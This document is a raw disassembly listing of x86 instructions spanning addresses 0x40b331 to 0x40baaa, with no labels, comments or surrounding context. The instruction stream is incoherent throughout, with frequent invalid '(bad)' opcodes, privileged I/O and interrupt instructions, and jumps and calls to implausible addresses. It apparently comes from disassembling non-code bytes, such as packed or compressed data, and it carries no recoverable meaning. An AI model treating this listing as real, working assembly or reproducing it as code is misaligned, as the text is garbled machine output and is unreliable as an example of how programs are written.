  40b331:	mov    al,0x4b
  40b333:	jne    0x40b2f2
  40b335:	jo     0x40b328
  40b337:	add    BYTE PTR [eax],bl
  40b339:	cli    
  40b33a:	ins    DWORD PTR es:[edi],dx
  40b33b:	add    DWORD PTR cs:[eax-0x8],ecx
  40b33f:	imul   ebx,DWORD PTR [eax+0x21d948],0x42
  40b346:	int3   
  40b347:	js     0x40b369
  40b349:	and    BYTE PTR [ebx+0x5ae33a1b],al
  40b34f:	mov    al,0x63
  40b351:	add    DWORD PTR [esi],ecx
  40b353:	add    al,0x64
  40b355:	and    ch,BYTE PTR [eax-0x49]
  40b358:	adc    eax,0x7e684ea7
  40b35d:	(bad)  
  40b35e:	adc    ebp,DWORD PTR [ecx]
  40b360:	mov    edi,0x9c7fdff2
  40b365:	(bad)  
  40b366:	push   ds
  40b367:	jnp    0x40b375
  40b369:	jo     0x40b3b9
  40b36b:	xlat   BYTE PTR ds:[ebx]
  40b36c:	js     0x40b31a
  40b36e:	js     0x40b320
  40b370:	pop    ss
  40b371:	shl    DWORD PTR [eiz*8-0x1de1785f],cl
  40b378:	aaa    
  40b379:	jg     0x40b3e8
  40b37b:	xchg   DWORD PTR [edi-0xdd0dc1],esp
  40b381:	(bad)  
  40b382:	mov    edi,0x3caf967a
  40b387:	cmp    esp,DWORD PTR [edi+edx*8]
  40b38a:	fcomi  st,st(5)
  40b38c:	push   edi
  40b38d:	sbb    edx,DWORD PTR [edx-0x76]
  40b390:	inc    ebx
  40b391:	and    ecx,DWORD PTR [edi+0x3695849d]
  40b397:	jns    0x40b418
  40b399:	inc    eax
  40b39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b39b:	pop    ecx
  40b39c:	or     eax,0xbd5420a7
  40b3a1:	mov    edi,0x4f43e4a0
  40b3a6:	in     al,dx
  40b3a7:	repz fwait
  40b3a9:	jmp    eax
  40b3ab:	or     DWORD PTR [esi+0x79aa36b7],esi
  40b3b1:	std    
  40b3b2:	loop   0x40b42b
  40b3b4:	mov    ebx,0xfaaf5dea
  40b3b9:	fsubp  st(5),st
  40b3bb:	jbe    0x40b386
  40b3bd:	repz pushf 
  40b3bf:	das    
  40b3c0:	cld    
  40b3c1:	(bad)  
  40b3c2:	xlat   BYTE PTR ds:[ebx]
  40b3c3:	mov    ecx,0xe670d578
  40b3c8:	rol    DWORD PTR [edi-0x17],0x74
  40b3cc:	ss push 0xddbc3677
  40b3d2:	iret   
  40b3d3:	sub    dh,0xc7
  40b3d6:	cli    
  40b3d7:	sub    al,0xc2
  40b3d9:	lods   eax,DWORD PTR ds:[esi]
  40b3da:	mov    ecx,0x73cc5d7a
  40b3df:	mov    edx,0x8884df30
  40b3e4:	cwde   
  40b3e5:	inc    edx
  40b3e6:	int    0xef
  40b3e8:	loop   0x40b375
  40b3ea:	inc    esi
  40b3eb:	iret   
  40b3ec:	push   ss
  40b3ed:	mul    DWORD PTR ds:0xc9aa4375
  40b3f3:	cmp    al,0xfc
  40b3f5:	lea    ecx,[eax-0x4f272278]
  40b3fb:	add    dh,BYTE PTR [eax+0x2c03d6ad]
  40b401:	dec    ebx
  40b402:	mov    esi,DWORD PTR [edi+eax*4+0x308cd274]
  40b409:	jg     0x40b3ed
  40b40b:	stos   BYTE PTR es:[edi],al
  40b40c:	cli    
  40b40d:	or     bl,dh
  40b40f:	and    esi,DWORD PTR [eax*2-0x7bd04ef8]
  40b416:	js     0x40b46f
  40b418:	inc    ebx
  40b419:	xor    BYTE PTR [eax+0x3c],0x6
  40b41d:	mov    al,0x13
  40b41f:	pushf  
  40b420:	xor    eax,0xad1b76ed
  40b425:	or     eax,0xb1b39965
  40b42a:	xor    eax,esp
  40b42c:	in     al,dx
  40b42d:	and    esp,DWORD PTR [edi]
  40b42f:	jns    0x40b421
  40b431:	cmp    eax,0x30da30e7
  40b436:	lahf   
  40b437:	into   
  40b438:	cmp    DWORD PTR [eax],edi
  40b43a:	fsub   QWORD PTR [edi+0x30]
  40b43d:	sbb    al,0x54
  40b43f:	cmp    eax,esp
  40b441:	inc    ebp
  40b442:	push   ecx
  40b443:	push   esp
  40b444:	imul   ebx,DWORD PTR [esi-0x3fe0a241],0xffffffdd
  40b44b:	mov    dh,0x1d
  40b44d:	mov    ch,0xff
  40b44f:	pop    esi
  40b450:	jge    0x40b454
  40b452:	popf   
  40b453:	dec    esi
  40b454:	(bad)  
  40b455:	or     eax,0x1ad34d57
  40b45a:	and    edx,DWORD PTR [esi+0x4a]
  40b45d:	xchg   ecx,eax
  40b45e:	addr16 sbb edi,edx
  40b461:	scas   al,BYTE PTR es:[edi]
  40b462:	iret   
  40b463:	icebp  
  40b464:	mov    ds:0x2d2ebda1,eax
  40b469:	fwait
  40b46a:	add    ch,dl
  40b46c:	mov    bl,0x79
  40b46e:	test   DWORD PTR [edi+0x52],ebp
  40b471:	pusha  
  40b472:	jecxz  0x40b4b1
  40b474:	out    0x36,eax
  40b476:	add    BYTE PTR [eax+0xbd36bf5],0xb7
  40b47d:	daa    
  40b47e:	push   ecx
  40b47f:	cmp    edi,ebp
  40b481:	jmp    DWORD PTR [eax-0x4203e01a]
  40b487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b488:	jns    0x40b46e
  40b48a:	xchg   ecx,eax
  40b48b:	inc    edi
  40b48c:	adc    BYTE PTR [edx+0x54],al
  40b48f:	icebp  
  40b490:	loope  0x40b4e7
  40b492:	rcl    DWORD PTR [eax+esi*1-0x2448915d],1
  40b499:	in     eax,0x67
  40b49b:	jg     0x40b483
  40b49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b49e:	jns    0x40b48f
  40b4a0:	jecxz  0x40b4b1
  40b4a2:	icebp  
  40b4a3:	scas   eax,DWORD PTR es:[edi]
  40b4a4:	jle    0x40b4a1
  40b4a6:	dec    ebx
  40b4a7:	cld    
  40b4a8:	lahf   
  40b4a9:	push   esi
  40b4ab:	add    ah,bl
  40b4ad:	fld    DWORD PTR [ebx-0x28]
  40b4b0:	(bad)  
  40b4b2:	lea    ebx,[edx+0x7a]
  40b4b5:	int    0x14
  40b4b7:	push   0x3482fa86
  40b4bc:	cld    
  40b4bd:	add    DWORD PTR [ebp-0x17279023],edx
  40b4c3:	fsubr  st(4),st
  40b4c5:	out    dx,eax
  40b4c6:	std    
  40b4c7:	repnz mov BYTE PTR [edi+0x46ae77de],ah
  40b4ce:	std    
  40b4cf:	jecxz  0x40b4cb
  40b4d1:	(bad)  
  40b4d2:	jmp    0x40b510
  40b4d4:	jl     0x40b4b8
  40b4d6:	cli    
  40b4d7:	push   cs
  40b4d8:	jne    0x40b478
  40b4da:	and    al,0x9
  40b4dc:	pop    edi
  40b4dd:	dec    dl
  40b4df:	mov    bl,0xfc
  40b4e1:	jmp    0xdc72e41d
  40b4e6:	jp     0x40b47a
  40b4e8:	dec    esi
  40b4e9:	outs   dx,DWORD PTR ds:[esi]
  40b4ea:	xchg   ebx,eax
  40b4eb:	jbe    0x40b554
  40b4ed:	add    al,0xc8
  40b4ef:	lds    ecx,FWORD PTR [ebx+ecx*8]
  40b4f2:	adc    eax,0xfbed8f65
  40b4f7:	mov    eax,0x5337580d
  40b4fc:	dec    ebp
  40b4fd:	fild   WORD PTR gs:[edi-0x61153389]
  40b504:	pop    ebx
  40b505:	aam    0x15
  40b507:	ds pushf 
  40b509:	mov    ds:0xbaa10209,eax
  40b50e:	test   al,0x9d
  40b510:	push   ebx
  40b511:	inc    esp
  40b512:	jne    0x40b4fb
  40b514:	mov    esi,0xe8801356
  40b519:	jp     0x40b549
  40b51b:	and    BYTE PTR [esi+eax*4+0x14],0xf3
  40b520:	mov    ah,BYTE PTR ds:0x2d6b12ac
  40b526:	mov    bl,0xd9
  40b528:	ins    BYTE PTR es:[edi],dx
  40b529:	imul   edi,eax,0xcc6210b3
  40b52f:	and    ah,dh
  40b531:	cli    
  40b532:	scas   al,BYTE PTR es:[edi]
  40b533:	leave  
  40b534:	jno    0x40b54e
  40b536:	rol    BYTE PTR [esi+0x0],0x0
  40b53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53b:	adc    ch,BYTE PTR [edi-0x44896dfc]
  40b541:	ret    
  40b542:	push   edi
  40b543:	mov    esi,0x9d3a45f2
  40b548:	ds pop ds
  40b54a:	(bad)  
  40b54b:	lock shl DWORD PTR [edi+eax*1+0x1d],cl
  40b550:	cli    
  40b551:	inc    ebx
  40b552:	aaa    
  40b553:	call   0x779eeb1f
  40b558:	cld    
  40b559:	push   ecx
  40b55a:	or     BYTE PTR [eax-0x6c],bh
  40b55d:	fmul   QWORD PTR [ebp-0xf]
  40b560:	out    dx,eax
  40b561:	aad    0x1f
  40b563:	adc    BYTE PTR [edi-0x5],bl
  40b566:	mov    fs,WORD PTR [eax]
  40b568:	mov    al,ds:0x4fffc535
  40b56d:	fnstsw WORD PTR [ebx-0x39]
  40b570:	pop    ebx
  40b571:	xchg   esi,eax
  40b572:	pop    ebp
  40b573:	cmc    
  40b574:	popf   
  40b575:	fistp  QWORD PTR [ebp-0x32]
  40b578:	mov    ecx,0x2f58bef9
  40b57d:	aad    0xab
  40b57f:	push   edi
  40b580:	mov    eax,ds:0xd5abbabb
  40b585:	sub    eax,0x2dd5b51a
  40b58a:	pop    ecx
  40b58b:	adc    ch,BYTE PTR ds:0x63242509
  40b591:	sbb    DWORD PTR [ecx+0x60],ecx
  40b594:	test   BYTE PTR [edx],al
  40b596:	add    ch,BYTE PTR [esi+eax*8-0x2]
  40b59a:	int3   
  40b59b:	mov    ebx,fs
  40b59d:	pusha  
  40b59e:	iret   
  40b59f:	or     al,0x1f
  40b5a1:	arpl   WORD PTR [edi+0x3481c01c],cx
  40b5a7:	mul    BYTE PTR [eax-0x7d]
  40b5aa:	(bad)  
  40b5ab:	data16 xchg BYTE PTR [eax-0x40],ah
  40b5af:	pusha  
  40b5b0:	les    eax,FWORD PTR [eax+0x42d90208]
  40b5b6:	push   0x9
  40b5b8:	dec    ecx
  40b5b9:	je     0x40b572
  40b5bb:	cmp    dh,BYTE PTR [edi+0x75]
  40b5be:	push   ebp
  40b5bf:	xchg   DWORD PTR [edx-0x51],ecx
  40b5c2:	repnz stos DWORD PTR es:[edi],eax
  40b5c4:	jp     0x40b5bf
  40b5c6:	out    0x7b,al
  40b5c8:	ret    0x3f9e
  40b5cb:	jbe    0x40b605
  40b5cd:	sti    
  40b5ce:	pushf  
  40b5cf:	jnp    0x40b62f
  40b5d1:	push   ebp
  40b5d2:	mov    ebp,0xef1aaa92
  40b5d7:	dec    edi
  40b5d8:	mov    ebp,0x7d8727ba
  40b5dd:	neg    BYTE PTR [edx-0x15]
  40b5e0:	mov    bh,0xc2
  40b5e2:	pop    esi
  40b5e3:	sub    ecx,DWORD PTR [ecx+ebp*1]
  40b5e6:	xchg   ebp,eax
  40b5e7:	retf   
  40b5e8:	out    dx,al
  40b5e9:	or     eax,0x6c4a9729
  40b5ee:	ins    BYTE PTR es:[edi],dx
  40b5ef:	outs   dx,BYTE PTR ds:[esi]
  40b5f0:	mov    dl,0xb1
  40b5f2:	sub    DWORD PTR [eax+0x63ef57d2],edx
  40b5f8:	push   esp
  40b5f9:	add    dl,dl
  40b5fb:	jmp    0x45:0x3f686435
  40b602:	test   eax,0x4109a00a
  40b607:	call   0x6988c6ff
  40b60c:	and    ch,dh
  40b60e:	aam    0xbe
  40b610:	push   0x79
  40b612:	xor    DWORD PTR [edi],0xffffffbd
  40b615:	popa   
  40b616:	das    
  40b617:	ja     0x40b5f6
  40b619:	jne    0x40b642
  40b61b:	in     eax,0x72
  40b61d:	(bad)  [esi]
  40b61f:	or     al,0xf3
  40b621:	mov    WORD PTR [ecx+0x57],?
  40b624:	stos   BYTE PTR es:[edi],al
  40b625:	pop    ecx
  40b626:	push   cs
  40b627:	ret    
  40b628:	shl    BYTE PTR [edx+0x7ff5ff81],1
  40b62e:	stc    
  40b62f:	add    BYTE PTR [ebx-0x5],cl
  40b632:	mov    esi,0xc7fccfc0
  40b637:	rcr    DWORD PTR [eax+ebx*2-0x43],cl
  40b63b:	add    DWORD PTR [edx+ebx*4+0x4f],0xffffff9c
  40b640:	push   ecx
  40b641:	hlt    
  40b642:	sbb    DWORD PTR [ebp-0x3],esi
  40b645:	mov    ecx,0xd8737e56
  40b64a:	test   al,0xf1
  40b64c:	iret   
  40b64d:	mul    DWORD PTR [ebx]
  40b64f:	fdivp  st(1),st
  40b651:	out    0x21,al
  40b653:	pop    ds
  40b654:	cld    
  40b655:	test   bl,0x94
  40b658:	dec    edx
  40b659:	dec    edx
  40b65a:	jp     0x40b641
  40b65c:	and    eax,0xfee9158
  40b661:	sub    DWORD PTR [edx+0x31],esi
  40b664:	stc    
  40b665:	cld    
  40b666:	jmp    0x40b65d
  40b668:	cmp    ah,BYTE PTR [edi+0xfe59f4f]
  40b66e:	(bad)  
  40b66f:	jmp    0x40b604
  40b671:	adc    ah,ch
  40b673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b674:	cmp    DWORD PTR [ecx],esi
  40b676:	dec    edi
  40b677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b678:	xor    al,BYTE PTR [ecx+0x32755417]
  40b67e:	mov    ds:0x8ac4c7ac,eax
  40b683:	jge    0x40b642
  40b685:	sub    al,0x32
  40b687:	(bad)  
  40b689:	cmc    
  40b68a:	ss xchg ecx,eax
  40b68c:	xor    al,BYTE PTR [edi]
  40b68e:	xchg   esi,esp
  40b690:	inc    esi
  40b691:	ins    BYTE PTR es:[edi],dx
  40b692:	add    esp,DWORD PTR [esi+0x18ee451f]
  40b698:	mov    bl,0x20
  40b69a:	int    0xf5
  40b69c:	jb     0x40b654
  40b69e:	add    DWORD PTR [edx],0x2224907c
  40b6a4:	xor    eax,0x152ac5fe
  40b6a9:	pop    edx
  40b6aa:	adc    al,0x42
  40b6ac:	lods   eax,DWORD PTR ds:[esi]
  40b6ad:	adc    al,0x33
  40b6af:	xor    edi,DWORD PTR ds:0xf264636e
  40b6b5:	xchg   BYTE PTR [eax-0x2d],al
  40b6b8:	daa    
  40b6b9:	outs   dx,BYTE PTR ds:[esi]
  40b6ba:	xor    eax,0x6f1be720
  40b6bf:	mov    ds:0x696f8142,eax
  40b6c4:	fisttp DWORD PTR ds:0x83b24802
  40b6ca:	iret   
  40b6cb:	mov    bl,0x86
  40b6cd:	xor    ch,ah
  40b6cf:	imul   ebp
  40b6d1:	add    ch,BYTE PTR [edx-0x3ff86b21]
  40b6d7:	shl    DWORD PTR [esi],cl
  40b6d9:	sbb    BYTE PTR [ebp+0x3d7d7b67],0xb0
  40b6e0:	jg     0x40b719
  40b6e2:	sti    
  40b6e3:	int    0xb2
  40b6e5:	mov    ecx,0x2176c8ff
  40b6ea:	call   0x864db2e4
  40b6ef:	inc    ebx
  40b6f0:	xchg   ebp,eax
  40b6f1:	or     DWORD PTR [eax+0x6f],ebx
  40b6f4:	xchg   ebx,eax
  40b6f5:	push   edx
  40b6f6:	push   edx
  40b6f7:	scas   al,BYTE PTR es:[edi]
  40b6f8:	xchg   esp,eax
  40b6f9:	cmp    DWORD PTR [edi-0x6],edi
  40b6fc:	and    dl,BYTE PTR [edi+0x57]
  40b6ff:	push   ebx
  40b700:	leave  
  40b701:	and    DWORD PTR [edi+ecx*1+0x40],ebx
  40b705:	bound  esi,QWORD PTR [ebx+edi*2+0xd0649dd]
  40b70c:	push   0xf1965b77
  40b711:	imul   ebx,eax,0xf4143c29
  40b717:	push   edi
  40b718:	test   BYTE PTR [eax],ch
  40b71a:	adc    DWORD PTR [edx+esi*2],esp
  40b71d:	enter  0xd8e4,0x80
  40b721:	mov    ebx,0x5aa1ef0f
  40b726:	lods   eax,DWORD PTR ds:[esi]
  40b727:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b729:	iret   
  40b72a:	out    0xfb,al
  40b72c:	scas   al,BYTE PTR es:[edi]
  40b72d:	call   0xce21a009
  40b732:	xchg   bx,ax
  40b734:	dec    edi
  40b735:	jl     0x40b723
  40b737:	cmp    eax,0x927a581c
  40b73c:	lahf   
  40b73d:	cld    
  40b73e:	ja     0x40b76f
  40b740:	lock in al,dx
  40b742:	dec    ebx
  40b743:	or     eax,DWORD PTR [ecx+edx*2-0x12de8ca7]
  40b74a:	jmp    0xdb0d:0x32633433
  40b751:	shl    BYTE PTR [ebx+0x45],cl
  40b754:	dec    esp
  40b755:	rcl    BYTE PTR [ecx+0xb],0xa4
  40b759:	(bad)  
  40b75a:	(bad)  
  40b75c:	xlat   BYTE PTR ds:[ebx]
  40b75d:	clc    
  40b75e:	lahf   
  40b75f:	jg     0x40b741
  40b761:	xor    eax,0x598d8d8c
  40b766:	loop   0x40b797
  40b768:	cmp    ah,0x45
  40b76b:	mov    edi,0xa73cd966
  40b770:	dec    edx
  40b771:	in     eax,dx
  40b772:	cmc    
  40b773:	sub    BYTE PTR [ebx],ch
  40b775:	imul   eax,DWORD PTR [ecx],0xfffffff3
  40b778:	jnp    0x40b771
  40b77a:	push   ecx
  40b77b:	test   eax,0x8caa524c
  40b780:	xchg   ecx,eax
  40b781:	les    eax,FWORD PTR [edx+0x9784ac4]
  40b787:	push   cs
  40b788:	shl    DWORD PTR [ebp+0x736f47c3],1
  40b78e:	xchg   ecx,eax
  40b78f:	adc    BYTE PTR [esp+eiz*4+0x59970cb6],0x4a
  40b797:	push   edx
  40b798:	inc    ebx
  40b799:	lahf   
  40b79a:	je     0x40b7cb
  40b79c:	mov    ds:0x184e4101,al
  40b7a1:	mov    DWORD PTR [ebx+eax*8-0x31],edx
  40b7a5:	fmul   DWORD PTR [edx]
  40b7a7:	or     ah,BYTE PTR [esi+edx*4-0x6c]
  40b7ab:	sub    esp,esi
  40b7ad:	aaa    
  40b7ae:	jg     0x40b75a
  40b7b0:	inc    edx
  40b7b1:	jb     0x40b77b
  40b7b3:	fdivr  DWORD PTR [eax-0x69]
  40b7b6:	mov    ecx,0x5c061559
  40b7bb:	add    BYTE PTR fs:[edi],dh
  40b7be:	(bad)  
  40b7c0:	adc    al,0x44
  40b7c2:	int    0x31
  40b7c4:	clc    
  40b7c5:	cmc    
  40b7c6:	out    dx,eax
  40b7c7:	(bad)  
  40b7c8:	(bad)  
  40b7c9:	out    dx,eax
  40b7ca:	mov    edi,0xb04041a5
  40b7cf:	sti    
  40b7d0:	test   BYTE PTR [eax],ah
  40b7d2:	into   
  40b7d3:	(bad)  
  40b7d4:	xor    al,0xf
  40b7d6:	push   0x6
  40b7d8:	imul   edi,DWORD PTR [esi],0xc0b667c9
  40b7de:	inc    ebx
  40b7df:	push   ecx
  40b7e0:	dec    ecx
  40b7e1:	in     al,0x1b
  40b7e3:	cmp    ebp,0x6bf223d7
  40b7e9:	popf   
  40b7ea:	push   ebx
  40b7eb:	mov    ah,0x6c
  40b7ed:	fisub  WORD PTR ds:0x1e7987a3
  40b7f3:	popa   
  40b7f4:	mov    edi,0xee003d6f
  40b7f9:	mov    cl,0xe5
  40b7fb:	jb     0x40b796
  40b7fd:	stos   DWORD PTR es:[edi],eax
  40b7fe:	stos   DWORD PTR es:[edi],eax
  40b7ff:	pop    ebx
  40b800:	mov    ah,0xdb
  40b802:	sahf   
  40b803:	call   0xa40c:0x9e842b89
  40b80a:	mov    cs,WORD PTR [ebx-0x5c]
  40b80d:	inc    esp
  40b80e:	and    al,0xd9
  40b810:	jmp    0x40b879
  40b812:	jne    0x40b893
  40b814:	in     al,dx
  40b815:	mov    dl,0xdd
  40b817:	dec    esi
  40b818:	mov    ds:0x5af40363,al
  40b81d:	and    dl,BYTE PTR [eax-0x505f33b7]
  40b823:	mov    ds:0x72e5cb27,al
  40b828:	popa   
  40b829:	lea    edi,[eax-0x2d]
  40b82c:	lahf   
  40b82d:	scas   al,BYTE PTR es:[edi]
  40b82e:	sub    eax,0x63a2adc3
  40b833:	je     0x40b826
  40b835:	jb     0x40b7f0
  40b837:	int3   
  40b838:	mov    ebx,0xf626f5df
  40b83d:	cs dec esp
  40b83f:	icebp  
  40b840:	mov    ds:0x7c27f13f,eax
  40b845:	loope  0x40b818
  40b847:	or     DWORD PTR [edx],esp
  40b849:	cmp    DWORD PTR [ecx+0x529999bf],esp
  40b84f:	lods   al,BYTE PTR ds:[esi]
  40b850:	and    eax,0x50615164
  40b855:	xlat   BYTE PTR ds:[ebx]
  40b856:	cli    
  40b857:	out    dx,eax
  40b858:	inc    esp
  40b859:	sbb    eax,0xf9b78d4e
  40b85e:	sahf   
  40b85f:	div    DWORD PTR [edi]
  40b861:	mov    eax,0xb12a35ef
  40b866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b867:	dec    ebx
  40b868:	cld    
  40b869:	inc    ebp
  40b86a:	mov    edi,0xb6600aae
  40b86f:	sbb    DWORD PTR [ebp+0x3e7df7c5],edx
  40b875:	idiv   ecx
  40b877:	inc    edi
  40b878:	jns    0x40b874
  40b87a:	stc    
  40b87b:	sub    ecx,DWORD PTR [esp+ecx*2-0x23]
  40b87f:	dec    ebx
  40b880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b881:	ss inc ebp
  40b883:	test   eax,0xd6f80e3c
  40b888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b889:	xor    BYTE PTR [ecx+0x7d6b5bf6],0x2a
  40b890:	xchg   ebp,eax
  40b891:	push   ebx
  40b892:	push   cs
  40b893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b894:	ja     0x40b825
  40b896:	loopne 0x40b90f
  40b898:	rep lods eax,DWORD PTR ds:[esi]
  40b89a:	frstor [ebx-0xb]
  40b89d:	mov    ecx,0x1bca0546
  40b8a2:	pop    ss
  40b8a3:	in     eax,dx
  40b8a4:	mov    eax,ds:0x2bd21de9
  40b8a9:	mov    ecx,0x622ea787
  40b8ae:	cmc    
  40b8af:	pop    ebp
  40b8b0:	test   esi,ecx
  40b8b2:	push   es
  40b8b3:	and    al,0xd3
  40b8b5:	lods   al,BYTE PTR ds:[esi]
  40b8b6:	inc    eax
  40b8b7:	dec    ecx
  40b8b8:	inc    edx
  40b8b9:	loopne 0x40b932
  40b8bb:	or     DWORD PTR [edx+0x367ec239],eax
  40b8c1:	mov    eax,ds:0xcf1be98f
  40b8c6:	repz scas al,BYTE PTR es:[edi]
  40b8c8:	push   ebp
  40b8c9:	or     eax,0xd0db9b68
  40b8ce:	scas   al,BYTE PTR es:[edi]
  40b8cf:	aas    
  40b8d0:	aas    
  40b8d1:	aaa    
  40b8d2:	xlat   BYTE PTR ds:[ebx]
  40b8d3:	or     al,0x57
  40b8d5:	xchg   esi,eax
  40b8d6:	xor    dl,cl
  40b8d8:	pop    ecx
  40b8d9:	jno    0x40b8c7
  40b8db:	sahf   
  40b8dc:	adc    DWORD PTR ds:0xaae8cd55,edi
  40b8e2:	loopne 0x40b95d
  40b8e4:	push   ds
  40b8e5:	mov    ebp,0x489b2f5e
  40b8ea:	les    ebp,FWORD PTR [ecx+0x45]
  40b8ed:	xchg   edx,eax
  40b8ee:	mov    ds:0xdceb5da8,al
  40b8f3:	(bad)  [ebx+edi*4]
  40b8f6:	div    DWORD PTR [ebx]
  40b8f8:	pop    ds
  40b8f9:	arpl   WORD PTR [eax],di
  40b8fb:	sbb    al,0x2a
  40b8fd:	adc    BYTE PTR [ebx],0xc2
  40b900:	stc    
  40b901:	loopne 0x40b905
  40b903:	aas    
  40b904:	lock fldcw WORD PTR [esi+0xd]
  40b908:	dec    eax
  40b909:	mov    ds:0xf564d98a,al
  40b90e:	jg     0x40b935
  40b910:	int    0xd2
  40b912:	add    dl,BYTE PTR [esi-0x2b668b5a]
  40b918:	cmp    ah,BYTE PTR [ecx+0x7f230e91]
  40b91e:	mov    cl,0x2a
  40b920:	and    bl,BYTE PTR [edx-0x5be3153c]
  40b926:	and    al,0x49
  40b928:	jl     0x40b904
  40b92a:	pop    ebp
  40b92b:	lahf   
  40b92c:	sub    edx,DWORD PTR [edi+0x55]
  40b92f:	rcl    BYTE PTR [ecx+ebp*4+0x54],0x2
  40b934:	shr    BYTE PTR [ecx],cl
  40b936:	mov    cl,0x26
  40b938:	dec    edx
  40b939:	into   
  40b93a:	jge    0x40b9aa
  40b93c:	xlat   BYTE PTR ds:[ebx]
  40b93d:	jmp    0x6369:0x4a5cfa6e
  40b944:	sbb    DWORD PTR [esi-0x3ca16417],edi
  40b94a:	dec    edi
  40b94b:	(bad)  
  40b94c:	fcomp  DWORD PTR [edi-0x20]
  40b94f:	mov    ebx,0xb29b62ff
  40b954:	ja     0x40b96f
  40b956:	lods   al,BYTE PTR ds:[esi]
  40b957:	shr    DWORD PTR [ebx],1
  40b959:	push   ecx
  40b95a:	retf   
  40b95b:	sub    DWORD PTR [edi-0x42fdbcbd],esi
  40b961:	pushf  
  40b962:	cmp    bl,bl
  40b964:	add    DWORD PTR [ecx-0x219df5b0],ebx
  40b96a:	cli    
  40b96b:	push   eax
  40b96c:	enter  0xbe07,0xfd
  40b970:	mov    al,0x8a
  40b972:	cwde   
  40b973:	aam    0xf6
  40b975:	xchg   esp,esi
  40b977:	fnsave [ebx-0xc32c3bb]
  40b97d:	mov    ecx,0xa9354cdb
  40b982:	inc    esi
  40b983:	mov    ds:0xce272bc1,eax
  40b988:	lock fistp QWORD PTR [esi]
  40b98b:	(bad)  
  40b98c:	cmp    al,0x22
  40b98e:	pop    eax
  40b98f:	mov    al,ds:0x52a598de
  40b994:	sbb    eax,0x242af7c7
  40b999:	mov    cl,0xb4
  40b99b:	(bad)  
  40b99c:	je     0x40b9a3
  40b99e:	stos   DWORD PTR es:[edi],eax
  40b99f:	fidiv  DWORD PTR gs:[edi-0x22aa4046]
  40b9a6:	cmp    eax,0xb0256ebd
  40b9ab:	fcmovnb st,st(7)
  40b9ad:	out    0x7c,al
  40b9af:	addr16 mov ebx,0x115acc54
  40b9b5:	test   eax,0x1e94dcca
  40b9ba:	lahf   
  40b9bb:	call   0xf82f401a
  40b9c0:	push   esp
  40b9c1:	(bad)  
  40b9c2:	mov    ecx,0xe7dcfcb3
  40b9c7:	xor    bh,BYTE PTR [edi+0x52]
  40b9ca:	push   0xffffffc2
  40b9cc:	(bad)  
  40b9cd:	adc    edx,DWORD PTR [edx-0x2b022a8]
  40b9d3:	inc    ebp
  40b9d4:	xor    al,0xaa
  40b9d6:	adc    DWORD PTR [esi-0x5cece179],ebx
  40b9dc:	in     eax,0xc0
  40b9de:	cmp    eax,0xeddba3cf
  40b9e3:	fidivr DWORD PTR [ecx+ecx*4]
  40b9e6:	mov    ecx,0x814a4b76
  40b9eb:	in     eax,0xdb
  40b9ed:	outs   dx,BYTE PTR ds:[esi]
  40b9ee:	adc    BYTE PTR [eax+0x3],al
  40b9f1:	mov    al,0x11
  40b9f3:	pop    ebx
  40b9f4:	or     BYTE PTR [esi-0x78],0x99
  40b9f8:	jmp    0x772f:0xce9fbe2e
  40b9ff:	push   ecx
  40ba00:	and    edi,0x1d3a7479
  40ba06:	jmp    0x40ba11
  40ba08:	mov    eax,0x1be00d96
  40ba0d:	or     eax,0xce5a77fb
  40ba12:	adc    BYTE PTR ds:0x385b7d28,cl
  40ba18:	pop    edx
  40ba19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba1a:	push   esp
  40ba1b:	test   BYTE PTR [esi],0x35
  40ba1e:	or     eax,0x25c64438
  40ba23:	or     BYTE PTR [ecx+eax*2-0x56c5ba37],dl
  40ba2a:	fs iret 
  40ba2c:	pop    ebx
  40ba2d:	std    
  40ba2e:	mov    cl,0x56
  40ba30:	imul   ax,WORD PTR [edx+esi*4],0xffb6
  40ba35:	add    BYTE PTR [ebp-0x70],dh
  40ba38:	les    esi,FWORD PTR [ebx+0x23c124b2]
  40ba3e:	push   cs
  40ba3f:	daa    
  40ba40:	jns    0x40ba36
  40ba42:	icebp  
  40ba43:	sar    DWORD PTR [edi+esi*8+0x42765adb],cl
  40ba4a:	lea    ebx,[ebx]
  40ba4c:	and    DWORD PTR [esi+0x422d0313],esi
  40ba52:	inc    ebx
  40ba53:	xchg   BYTE PTR [ecx-0x778bc5e3],ah
  40ba59:	jg     0x40ba54
  40ba5b:	dec    edi
  40ba5c:	aas    
  40ba5d:	int3   
  40ba5e:	int3   
  40ba5f:	hlt    
  40ba60:	addr16 clc 
  40ba62:	(bad)  
  40ba63:	mov    edi,0xb47e9176
  40ba68:	dec    eax
  40ba69:	push   esi
  40ba6a:	jp     0x40bad6
  40ba6c:	jnp    0x40b9ee
  40ba6e:	xchg   ebx,eax
  40ba6f:	in     eax,0x27
  40ba71:	test   esi,edi
  40ba73:	add    al,BYTE PTR [ebx-0x2211f1f4]
  40ba79:	loop   0x40ba2a
  40ba7b:	jle    0x40ba71
  40ba7d:	and    BYTE PTR [ebx-0x4d],dh
  40ba80:	xchg   ebx,eax
  40ba81:	xchg   esi,eax
  40ba82:	lock scas eax,DWORD PTR es:[edi]
  40ba84:	lds    ebx,FWORD PTR [eax-0x23]
  40ba87:	in     eax,dx
  40ba88:	out    0x37,al
  40ba8a:	dec    ecx
  40ba8b:	adc    al,dh
  40ba8d:	mov    edi,0x7cdab569
  40ba93:	out    0xb3,al
  40ba95:	(bad)  
  40ba96:	mov    bl,0xb6
  40ba98:	push   ebp
  40ba99:	popa   
  40ba9a:	iret   
  40ba9b:	fdivr  QWORD PTR [esi]
  40ba9d:	dec    edx
  40ba9e:	xchg   ebp,eax
  40ba9f:	xor    DWORD PTR [edx-0x5ffd5660],eax
  40baa5:	mov    WORD PTR [ebx],ss
  40baa7:	inc    edx
  40baa8:	mov    WORD PTR [esi],?
  40baaa:	out    0x88,al
